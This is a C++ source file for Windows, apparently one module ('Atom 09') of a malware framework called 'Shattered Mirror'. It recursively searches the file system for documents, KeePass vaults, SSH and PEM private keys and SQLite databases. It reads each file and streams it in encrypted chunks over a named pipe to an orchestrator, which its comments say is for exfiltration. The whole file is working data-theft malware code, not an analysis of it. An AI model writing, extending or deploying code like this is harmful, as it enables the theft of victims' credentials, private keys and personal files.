/*=============================================================================
 * Shattered Mirror v1 — Atom 09: File System Traversal
 *
 * Recursively walks the file system looking for interesting files (documents, 
 * databases, keys). Skips system directories and massive files.
 * Streams localized files into the Orchestrator's IPC for exfiltration.
 *===========================================================================*/

#include "Atom_09_FileSys.h"
#include "../Orchestrator/AtomManager.h"
#include "../Orchestrator/Config.h"
#include <cstring>

/* Skip standard junk/system directories */
const WCHAR* g_SkipDirs[] = {
    L"Windows", L"Program Files", L"Program Files (x86)", L"ProgramData", L"Appended", L"Temp"
};

/* File extensions we care about */
const WCHAR* g_TargetExts[] = {
    L".txt", L".pdf", L".docx", L".xlsx", L".kdbx", L".pem", L".ppk", L".sqlite"
};

#define MAX_FILE_SIZE (50 * 1024 * 1024) /* 50MB limit */

static BOOL ShouldSkipDir(const WCHAR* szDirName) {
    for (int i = 0; i < sizeof(g_SkipDirs) / sizeof(g_SkipDirs[0]); i++) {
        if (lstrcmpiW(szDirName, g_SkipDirs[i]) == 0) return TRUE;
    }
    return FALSE;
}

static BOOL IsTargetExtension(const WCHAR* szFileName) {
    const WCHAR* pExt = wcsrchr(szFileName, L'.');
    if (!pExt) return FALSE;

    for (int i = 0; i < sizeof(g_TargetExts) / sizeof(g_TargetExts[0]); i++) {
        if (lstrcmpiW(pExt, g_TargetExts[i]) == 0) return TRUE;
    }
    return FALSE;
}

/* 
 * Stage the file into the IPC for Exfiltration
 */
static void StageFileForExfil(HANDLE hPipe, const WCHAR* szFilePath, BYTE* pSharedKey) {
    HANDLE hFile = CreateFileW(szFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    DWORD dwSize = GetFileSize(hFile, NULL);
    if (dwSize == 0 || dwSize > MAX_FILE_SIZE) {
        CloseHandle(hFile);
        return;
    }

    BYTE* pBuffer = (BYTE*)HeapAlloc(GetProcessHeap(), 0, dwSize);
    if (!pBuffer) {
        CloseHandle(hFile);
        return;
    }

    DWORD dwRead = 0;
    if (ReadFile(hFile, pBuffer, dwSize, &dwRead, NULL) && dwRead == dwSize) {
        
        /* Send a metadata header first */
        char szHeader[512] = { 0 };
        wsprintfA(szHeader, "FILE|%ws|%u", szFilePath, dwSize);
        
        IPC_MESSAGE msgMeta = { 0 };
        msgMeta.dwSignature = 0x534D4952;
        msgMeta.CommandId = CMD_REPORT;
        msgMeta.dwPayloadLen = lstrlenA(szHeader) + 1;
        lstrcpyA((char*)msgMeta.Payload, szHeader);
        IPC_SendMessage(hPipe, &msgMeta, pSharedKey, 16);

        /* Stream the file chunks */
        DWORD offset = 0;
        while (offset < dwSize) {
            DWORD chunk = dwSize - offset;
            if (chunk > MAX_IPC_PAYLOAD_SIZE) chunk = MAX_IPC_PAYLOAD_SIZE;

            IPC_MESSAGE msgData = { 0 };
            msgData.dwSignature = 0x534D4952;
            msgData.CommandId = CMD_REPORT; 
            msgData.dwPayloadLen = chunk;
            memcpy(msgData.Payload, pBuffer + offset, chunk);

            IPC_SendMessage(hPipe, &msgData, pSharedKey, 16);
            offset += chunk;
            Sleep(10); // Throttle
        }
    }

    HeapFree(GetProcessHeap(), 0, pBuffer);
    CloseHandle(hFile);
}

/*
 * Recursive directory walk 
 */
static void WalkDirectory(HANDLE hPipe, const WCHAR* szDir, BYTE* pSharedKey) {
    WCHAR szSearch[MAX_PATH];
    wsprintfW(szSearch, L"%s\\*", szDir);

    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW(szSearch, &fd);
    
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (lstrcmpW(fd.cFileName, L".") == 0 || lstrcmpW(fd.cFileName, L"..") == 0) {
            continue;
        }

        WCHAR szFullPath[MAX_PATH];
        wsprintfW(szFullPath, L"%s\\%s", szDir, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (!ShouldSkipDir(fd.cFileName)) {
                WalkDirectory(hPipe, szFullPath, pSharedKey);
            }
        } else {
            if (IsTargetExtension(fd.cFileName) && fd.nFileSizeLow < MAX_FILE_SIZE) {
                StageFileForExfil(hPipe, szFullPath, pSharedKey);
            }
        }
    } while (FindNextFileW(hFind, &fd));

    FindClose(hFind);
}

DWORD WINAPI FileSystemAtomMain(LPVOID lpParam) {
    DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
    HANDLE hPipe = IPC_ConnectToPipe(dwAtomId);
    if (!hPipe) return 1;

    BYTE SharedSessionKey[16];
    memcpy(SharedSessionKey, Config::PSK_ID, 16);

    while (TRUE) {
        IPC_MESSAGE inMsg = { 0 };
        if (IPC_ReceiveMessage(hPipe, &inMsg, SharedSessionKey, 16)) {
            if (inMsg.CommandId == CMD_EXECUTE) {
                // Interpret payload as path
                WCHAR szTarget[MAX_PATH] = { 0 };
                MultiByteToWideChar(CP_ACP, 0, (char*)inMsg.Payload, -1, szTarget, MAX_PATH);

                if (szTarget[0] != L'\0') {
                    WalkDirectory(hPipe, szTarget, SharedSessionKey);
                }
            }
        } else if (GetLastError() == ERROR_BROKEN_PIPE) {
            break;
        }
        Sleep(500);
    }
    
    return 0;
}
